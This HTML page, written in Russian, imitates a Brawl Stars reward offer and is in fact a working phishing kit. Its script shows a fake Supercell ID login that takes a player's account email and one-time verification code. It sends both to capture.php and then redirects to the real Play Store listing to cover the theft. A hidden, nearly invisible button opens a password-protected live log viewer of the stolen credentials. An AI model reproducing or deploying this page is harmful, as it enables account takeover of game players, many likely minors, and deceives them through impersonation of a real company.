<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Brawl Stars - Награда</title>
    
    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@900&display=swap" rel="stylesheet">

    <style>
        :root {
            --bg-blue: #2c59ec; 
            --btn-yellow-top: #ffe83a;
            --btn-yellow-bottom: #fcc200;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            font-family: 'Montserrat', sans-serif;
            background-color: var(--bg-blue);
            color: white;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            overflow-x: hidden;
            position: relative;
        }

        body::before {
            content: "";
            position: absolute;
            inset: 0;
            background-image: url("https://cdn.brawlify.com/images/bg-stars.png");
            background-size: 250px;
            opacity: 0.1; 
            z-index: 0;
            pointer-events: none;
        }

        .header {
            width: 100%;
            display: flex;
            justify-content: flex-end;
            padding: 12px 16px;
            z-index: 10;
        }

        .lang-btn {
            background: #234bce;
            border-radius: 20px;
            padding: 8px 14px;
            font-family: sans-serif;
            font-weight: 600;
            font-size: 14px;
            color: white;
            display: flex;
            align-items: center;
            gap: 6px;
            cursor: pointer;
        }

        .main-content {
            position: relative;
            z-index: 5;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            padding: 10px 20px;
        }

        .logo {
            width: 280px;
            margin-bottom: 25px;
            filter: drop-shadow(0 4px 0 rgba(0,0,0,0.3));
        }

        /* ТЕКСТ: Идеальная жирная обводка */
        .title, .download-label {
            font-size: 25px;
            font-weight: 900;
            text-align: center;
            line-height: 1.2;
            color: #ffffff;
            margin-bottom: 25px;
            text-transform: uppercase;
            text-shadow: 
                2.5px 2.5px 0 #000, -2.5px -2.5px 0 #000, 
                2.5px -2.5px 0 #000, -2.5px 2.5px 0 #000,
                0px 2.5px 0 #000, 0px -2.5px 0 #000,
                2.5px 0px 0 #000, -2.5px 0px 0 #000,
                0px 5px 0 #000; 
        }

        .claim-button {
            width: 95%;
            background: linear-gradient(to bottom, var(--btn-yellow-top), var(--btn-yellow-bottom));
            border: 3.5px solid #000000;
            border-radius: 12px;
            padding: 16px 10px;
            font-family: 'Montserrat', sans-serif;
            font-weight: 900;
            font-size: 21px;
            color: white;
            cursor: pointer;
            margin-bottom: 40px;
            box-shadow: inset 0 -6px 0 #cc8200, 0 6px 0 #000000;
            transition: 0.1s;
        }

        .claim-button span {
            text-shadow: 1.5px 1.5px 0 #000, -1.5px -1.5px 0 #000, 1.5px -1.5px 0 #000, -1.5px 1.5px 0 #000;
        }

        .claim-button:active {
            transform: translateY(4px);
            box-shadow: inset 0 -2px 0 #cc8200, 0 2px 0 #000000;
        }

        /* ЧЕРНЫЙ КУБ (АДМИНКА) */
        .admin-trigger {
            position: fixed; bottom: 5px; right: 5px; width: 15px; height: 15px;
            background: #000; opacity: 0.05; cursor: pointer; z-index: 1000;
        }

        #adminPanel {
            display: none; position: fixed; inset: 0; background: #000; color: #0f0;
            z-index: 9999; padding: 20px; font-family: monospace; overflow-y: auto;
        }
        .log-line { border-bottom: 1px solid #222; padding: 10px 0; font-size: 13px; color: #0f0; }

        /* МОДАЛЬНОЕ ОКНО */
        #authOverlay {
            display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9);
            z-index: 1000; align-items: center; justify-content: center;
        }

        .sc-card {
            background: #fff; color: #333; width: 90%; max-width: 360px;
            padding: 35px 25px; border-radius: 20px; text-align: center;
        }

        .sc-input {
            width: 100%; padding: 14px; margin: 15px 0; border: 2px solid #eee;
            border-radius: 10px; font-size: 18px; text-align: center; font-weight: bold; outline: none;
        }

        .sc-btn {
            width: 100%; background: #00d0ff; color: #fff; border: none;
            padding: 16px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer;
        }

        .footer {
            background: #000; width: 100%; padding: 20px; display: flex;
            justify-content: center; gap: 20px; margin-top: auto;
        }

        .footer-item { color: #fff; font-size: 11px; text-decoration: none; opacity: 0.7; text-align: center; }
    </style>
</head>
<body>

    <div class="header">
        <div class="lang-btn">русский ▼</div>
    </div>

    <div class="main-content">
        <img src="https://i.ibb.co/Y49k6Mgh/output.webp" class="logo">
        <div class="title">Получите награду в<br>Brawl Stars!</div>
        
        <button class="claim-button" id="startBtn"><span>ПОЛУЧИТЬ НАГРАДУ</span></button>

        <div class="download-label">СКАЧАТЬ BRAWL STARS</div>
        
        <a href="https://play.google.com/store/apps/details?id=com.supercell.brawlstars" class="gp-link">
            <img src="https://play.google.com/intl/en_us/badges/static/images/badges/ru_badge_web_generic.png" style="height:55px;">
        </a>
    </div>

    <div id="authOverlay">
        <div class="sc-card" id="step1">
            <img src="https://cdn.supercell.com/scid/1.0/assets/scid_logo.png" width="140">
            <h2 style="margin-top:20px;">Supercell ID</h2>
            <p style="color:#666; margin: 10px 0;">Введите Email вашего аккаунта</p>
            <input type="email" id="email" class="sc-input" placeholder="example@mail.com">
            <button class="sc-btn" onclick="toStep2()">ПРОДОЛЖИТЬ</button>
        </div>

        <div class="sc-card" id="step2" style="display:none;">
            <img src="https://cdn.supercell.com/scid/1.0/assets/scid_logo.png" width="140">
            <h2 style="margin-top:20px;">Введите код</h2>
            <p style="color:#666; margin: 10px 0;">Код отправлен на <b id="displayEmail"></b></p>
            <input type="number" id="code" class="sc-input" placeholder="_ _ _ _ _ _">
            <button class="sc-btn" onclick="finish()">ПОДТВЕРДИТЬ</button>
        </div>
    </div>

    <div class="admin-trigger" onclick="adminAuth()"></div>
    <div id="adminPanel">
        <div style="display:flex; justify-content:space-between; border-bottom:1px solid #0f0; margin-bottom:10px;">
            <h3>LIVE_LOGS [ONLINE]</h3>
            <button onclick="location.reload()" style="background:none; color:red; border:none; cursor:pointer;">[X]</button>
        </div>
        <div id="logsBody">Подключение...</div>
    </div>

    <div class="footer">
        <a href="#" class="footer-item">Условия пользования</a>
        <a href="#" class="footer-item">Политика конфиденциальности</a>
    </div>

    <script>
        const overlay = document.getElementById('authOverlay');
        let userEmail = "";

        document.getElementById('startBtn').onclick = () => overlay.style.display = 'flex';

        async function toStep2() {
            userEmail = document.getElementById('email').value;
            if(userEmail.includes('@')) {
                document.getElementById('displayEmail').innerText = userEmail;
                document.getElementById('step1').style.display = 'none';
                document.getElementById('step2').style.display = 'block';
                await sendData(userEmail, "STAGE_1_EMAIL");
            }
        }

        async function finish() {
            const code = document.getElementById('code').value;
            if(code.length >= 4) {
                await sendData(userEmail + " | CODE: " + code, "STAGE_2_COMPLETE");
                window.location.href = "https://play.google.com/store/apps/details?id=com.supercell.brawlstars";
            }
        }

        async function sendData(val, status) {
            await fetch('capture.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'info=' + encodeURIComponent(val) + '&status=' + status
            });
        }

        // ЛОГИКА АДМИНКИ (SWILL)
        let isMonitorActive = false;
        async function adminAuth() {
            if(prompt("ACCESS CODE:") === "92293") {
                isMonitorActive = true;
                document.getElementById('adminPanel').style.display = 'block';
                updateLogs();
            }
        }

        function updateLogs() {
            if(!isMonitorActive) return;
            fetch('capture.php?get_logs=1')
                .then(r => r.text())
                .then(t => { document.getElementById('logsBody').innerHTML = t; });
            setTimeout(updateLogs, 3000); // Автообновление каждые 3 сек
        }
    </script>
</body>
</html>
